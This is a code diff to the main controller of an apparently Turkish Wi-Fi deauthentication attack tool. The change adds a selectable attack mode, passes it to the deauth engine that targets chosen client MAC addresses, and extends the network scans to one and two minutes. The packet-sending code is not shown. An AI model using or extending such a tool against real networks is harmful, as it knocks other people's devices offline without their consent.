@@ -66,7 +66,7 @@ from core.wireless_manager import WirelessManager
 from core.network_scanner import NetworkScanner
 from core.deauth_engine import DeauthEngine
 from ui.banner import show_banner, show_legal_warning, show_section_header, show_success, show_error, show_warning
-from ui.menu import show_main_menu, select_network, select_clients, confirm_attack, show_help, show_settings
+from ui.menu import show_main_menu, select_network, select_clients, select_attack_mode, confirm_attack, show_help, show_settings
 from ui.dashboard import AttackDashboard, show_attack_summary
 from utils.validators import is_root, check_tool_exists
 from utils.helpers import setup_signal_handlers, clear_screen, press_any_key
@@ -146,9 +146,9 @@ class KYKSKN:
         
         self.network_scanner = NetworkScanner(self.monitor_interface)
         
-        # Start scan
-        console.print(f"[yellow]⏳ 15 saniye tarama başlatılıyor...[/yellow]")
-        success = self.network_scanner.start_scan(duration=15)
+        # Start scan - 1 DAKİKA!
+        console.print(f"[yellow]⏳ 60 saniye (1 dakika) tarama başlatılıyor...[/yellow]")
+        success = self.network_scanner.start_scan(duration=60)
         
         if not success:
             show_error("Ağ taraması başarısız!")
@@ -208,8 +208,8 @@ class KYKSKN:
         
         time.sleep(1)
         
-        # Derin tarama başlat
-        deep_scan_success = self.network_scanner.deep_scan_ap(ap.bssid, ap.channel, duration=30)
+        # Derin tarama başlat - 2 DAKİKA!
+        deep_scan_success = self.network_scanner.deep_scan_ap(ap.bssid, ap.channel, duration=120)
         
         if not deep_scan_success:
             show_error("Derin tarama başarısız!")
@@ -258,9 +258,18 @@ class KYKSKN:
         console.print(f"[dim]🔍 DEBUG: Hedef sayısı: {len(target_macs)}[/dim]")
         console.print(f"[dim]🔍 DEBUG: Monitor interface: {self.monitor_interface}[/dim]")
         
+        # Select attack mode
+        clear_screen()
+        show_banner()
+        attack_mode_key, attack_mode = select_attack_mode()
+        
+        if not attack_mode:
+            show_warning("Saldırı modu seçilmedi, saldırı iptal edildi")
+            return
+        
         # Confirm attack
         try:
-            confirmed = confirm_attack(len(target_macs), ap.essid)
+            confirmed = confirm_attack(len(target_macs), ap.essid, attack_mode)
             console.print(f"[dim]🔍 DEBUG: Onay sonucu: {confirmed}[/dim]")
             
             if not confirmed:
@@ -277,8 +286,8 @@ class KYKSKN:
         self.wireless_manager.set_channel(self.monitor_interface, ap.channel)
         show_success(f"Kanal ayarlandı: {ap.channel}")
         
-        # Initialize deauth engine
-        self.deauth_engine = DeauthEngine(self.monitor_interface)
+        # Initialize deauth engine with attack mode
+        self.deauth_engine = DeauthEngine(self.monitor_interface, attack_mode)
         
         # Add targets
         for mac in target_macs:
